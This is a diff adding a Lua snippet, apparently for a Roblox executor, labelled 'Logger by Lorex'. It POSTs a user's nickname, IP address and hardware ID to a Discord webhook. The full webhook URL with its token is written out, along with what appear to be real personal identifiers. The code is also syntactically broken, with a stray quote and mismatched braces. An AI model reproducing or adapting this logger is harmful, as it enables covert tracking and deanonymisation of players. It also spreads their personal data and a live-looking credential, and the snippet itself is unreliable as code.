@@ -1,0 +1,30 @@
+local result = request({ -- request
+    ["Url"] = "https://discord.com/api/webhooks/1504921561239519394/b_ptIshdMei9Ymij8Ig_z83sEWbd1fnZ9liPzs5MuUfj_AyGVj-56qnieqewFBNPdnmZ", --already deleted by pato
+    ["Method"] = "POST",
+    ["Headers"] = {
+        ["Content-Type"] = "application/json"
+    }",
+    ["Body"] = game:GetService("HttpService"):JSONEncode({
+    embeds = { {
+            fields = { {
+                    value = "```POPMATT123```",
+                    name = "👤 Nickname",
+                    inline = true
+                }, {
+                    value = "```45.175.107.66```",
+                    name = "🌐 IP Address",
+                    inline = true
+                }, {
+                    value = "```f827bc4d7b618dd3b6f0c4b8fe4c84c9d70fa4ba8bb4f5274db909d164ac559a0f7b6b5b6ccede18fc3f39592efb06eb6c0719a2fc7057162fd2feea237a6659```",
+                    name = "💻 HWID",
+                    inline = false
+                } },
+            title = "🔒 New report",
+            footer = {
+                text = "Logger by Lorex"
+            },
+            color = 2830129,
+            timestamp = "2026-07-09T21:51:39Z"
+        } }
+})
+})
